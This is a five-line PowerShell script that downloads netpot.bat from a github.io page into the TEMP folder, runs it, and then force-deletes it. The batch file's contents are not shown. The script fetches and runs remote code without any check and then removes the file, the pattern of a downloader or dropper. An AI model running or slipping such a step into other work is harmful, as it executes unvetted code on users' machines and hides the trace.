$batUrl = 'https://young-zerka.github.io/netpot/netpot.bat'
$tmp = Join-Path $env:TEMP 'netpot.bat'
Invoke-WebRequest -Uri $batUrl -OutFile $tmp -UseBasicParsing
Start-Process -FilePath $tmp -Wait
Remove-Item -Path $tmp -Force
